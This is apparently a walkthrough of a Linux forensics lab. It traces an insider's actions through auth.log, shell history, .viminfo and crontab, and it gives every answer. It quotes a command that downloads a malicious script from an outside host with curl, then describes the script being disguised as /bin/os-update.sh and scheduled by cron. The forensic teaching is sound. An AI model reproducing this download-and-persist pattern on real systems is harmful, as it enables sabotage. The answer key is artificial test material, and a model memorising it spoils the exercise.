# 🐧 Disgruntled: Insider Threat – Linux Forensics Investigation

## 🧠 Scenario

An employee from the IT department of one of our clients, **CyberT**, was recently arrested for running a phishing operation. CyberT has asked us to investigate a Linux system the individual accessed to determine whether any malicious activity occurred prior to their arrest.

This investigation required reviewing log files, shell history, and cron jobs to uncover potential insider threats.

---

## 🔍 Questions & Answers

---

### 1) The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

```bash
cat /var/log/auth.log | grep "install"
```
![installed package](Task1_answer.png)


>*Explanation:* checked `/var/log/auth.log` for commands involving installation. Since `apt` is usually used with `sudo`, we searched for the term `install` and got our answer

> **Answer:** `/usr/bin/apt install dokuwiki`

---

### 2) What was the present working directory (PWD) when the previous command was run?

```bash
cat /var/log/auth.log | grep "install"
```
![installed package](Task1_answer.png)

>*Explanation:* The auth.log entry for the apt install command contains a `PWD` field or present-working-directory

> **Answer:** `/home/cybert`

---

### 3) Which user was created after the package from the previous task was installed?

```bash
cat /var/log/auth.log | grep "adduser"
```
![user added](task2_q1_answer.png)

>*Explanation:* In linux, there is the `adduser` command, grep the command within the same log to get the answer 

> **Answer:** `it-admin`

---

### 4) A user was then later given sudo privileges. When was the sudoers file updated?  
_Format: Month Day HH:MM:SS_

```bash
cat /var/log/auth.log | grep "visudo"
```
![sudo](task2_q2_answer.png)

>*Explanation:* I looked at the hint and it mentions the use of "visudo" which is used to edit the sudoers, grep any commands with "visudo" and the answer is there.

> **Answer:** `Dec 28 06:27:34`

---

### 5) A script file was opened using the "vi" text editor. What is the name of this file?

```bash
cat /var/log/auth.log | grep "vi"
```
![scriptfile](task2_q3_answer.png)

>*Explanation:* I looked for instances of the Vi editor being launched, grep "vi" and we'll get one folder that is just /bin/vi/scriptname.sh

> **Answer:** `bomb.sh`

---

### 6) What is the command used that created the file bomb.sh?

```bash
cat /home/it-admin/.bash_history
```
![command](task3_q1_answer.png)

>*Explanation:* I want to find shell history for the specific user "it-admin" so let's check that users .bash_history

> **Answer:** `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

---

### 7) The file was renamed and moved to a different directory. What is the full path of this file now?

```bash
cat /home/it-admin/.viminfo
```
![rename](task3_q2_answer.png)

>*Explanation:* I had to use the hint here, "The .viminfo file contains a list of files edited and saved via vi".  So I went to the directory of the it-admin and listed it's contents with ls -a, then used cat .viminfo to get the result

> **Answer:** `/bin/os-update.sh`

---

### 8) When was the file from the previous question last modified?  
_Format: Month Day HH:MM_

```bash
ls -al --full-time /bin/os-update.sh
```
![modified](task3_q3_answer.png)

>*Explanation:* In the same directory use, ls -al --full-time to get the timestamps for modifications.

> **Answer:** `Dec 28 06:29`

---

### 9) What is the name of the file that will get created when the file from the first question executes?

```bash
cat /bin/os-update.sh
```

![newfile](task3_q4_answer.png)

>*Explanation:* Navigate to the directory that the threat actor stored the os-update.sh file in, from here, cat the .sh file to view the code and there is an output .txt file

> **Answer:** `goodbye.txt`

---

### 10) At what time will the malicious file trigger?  
_Format: HH:MM AM/PM_

```bash
cat /etc/crontab
```
![time](task4_q1_answer.png)

>*Explanation:* Crontabs are where scheduled tasks are stored. You can use the hint if needed, the two values shown are a 0 for minutes and an 8 for hours. 

> **Answer:** `08:00 AM`

---



